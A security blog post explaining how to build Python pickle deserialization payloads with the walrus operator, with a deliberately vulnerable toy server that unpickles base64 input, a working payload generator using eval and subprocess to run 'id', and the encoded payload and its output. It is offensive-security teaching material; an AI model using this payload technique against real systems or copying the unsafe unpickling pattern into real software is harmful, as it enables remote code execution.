---
layout: post
title: "Simpler unpickle payloads with the walrus operator"
date: 2022-01-07 01:00
type: post
published: true
comments: true
categories: software
---

When exploiting Python deserialization, specifically, Pickle, vulnerabilities you need to craft a payload consisting of a collection of arguments and a callable that is available on the server. Most commonly you can use the `eval` function and a string to be evaluated. This is fairly flexible and from here you can typically import the `os` module and call `os.system` to do whatever you want. Sometimes there can be some limitations in place, for example, you might not get the output of the application directly and it might be blocking outbound connections preventing reverse shells. In some situations you need the result of the unpickle operation to return an object with specific properties. If you are lucky and convenient classes exist on the target and you have knowledge of them you might get away with simply constructing one of them. If this is not the case it is slightly trickier.

A big issue is that `eval` only evaluates a single expression so you can't declare your own classes since that is a statement, not an expression. With the introduction of the new walrus operator in Python, this is now much easier since we can now perform assignments as an expression. The key idea is that we can create a tuple where each element in the tuple can access items which have been assigned in a previous element. For example, this is a valid Python expression which will evaluate to `2`.

{% highlight python %}
(a:=1, b:=a+a, b)[-1]
{% endhighlight %}

We can use the same pattern to construct completely arbitrary objects. As a toy example, let's say you have a server like this which takes some input and unpickles it:

{% highlight python %}
#!/usr/bin/env python3

import base64
import pickle

class Item(object):
    def __init__(self, text):
        self.text = text

    def process(self):
        return self.text.upper().encode()

while True:
    try:
        b64data = input('Pickled object: ')
        data = base64.b64decode(b64data)
        item = pickle.loads(data)
        res = item.process()
        print(f'Result: {res.decode()}')
    except KeyboardInterrupt:
        print('Exiting') 
        break
    except Exception as e:
        print(f'An error occurred while processing data: {e}')
{% endhighlight %}

Let's pretend that we do not get any stdout data from the unpickling and that no outbound connections are allowed so a reverse shell won't do. Note that the unpickled object needs to have a `.process()`method which returns something which we can call `.decode()` on which in turn should return a string. We can then use the following code to craft such a payload:

{% highlight python %}
#!/usr/bin/env python3

import base64
import pickle

class Payload(object):
    def __reduce__(self):
        return eval, ('(a:=type("A", (object,), {}),b:=a(),b.__setattr__("process", lambda: __import__("subprocess").check_output("id")),b)[-1]',)

payload = Payload()
payload = base64.b64encode(pickle.dumps(payload)).decode()
print(payload)
{% endhighlight %}

The key element here is the Python expression:

{% highlight python %}
(
    a:=type("A", (object,), {}),
    b:=a(),
    b.__setattr__("process",
        lambda: __import__("subprocess").check_output("id")
    ),
    b
)[-1]
{% endhighlight %}

The first element of the tuple creates a new type called `A` and assigns it to `a`. We then instantiate an object of this type in variable `b`. We then set the `.process` attribute of this object to be a function which will call the `id` command and return the output. Finally we put the object itself as the last element of the tuple and use the `[-1]`indexing operation to extract our crafted object. Running this code and providing it as input to our server results in the following:

```
Pickled object: gASVlAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIx4KGE6PXR5cGUoIkEiLCAob2JqZWN0LCksIHt9KSxiOj1hKCksYi5fX3NldGF0dHJfXygicHJvY2VzcyIsIGxhbWJkYTogX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiKSksYilbLTFdlIWUUpQu
Result: uid=1000(zetatwo) gid=1000(zetatwo) groups=1000(zetatwo)
```

I hope this little trick come in handy whenever you are dealing with Python unpickle vulnerabilities.
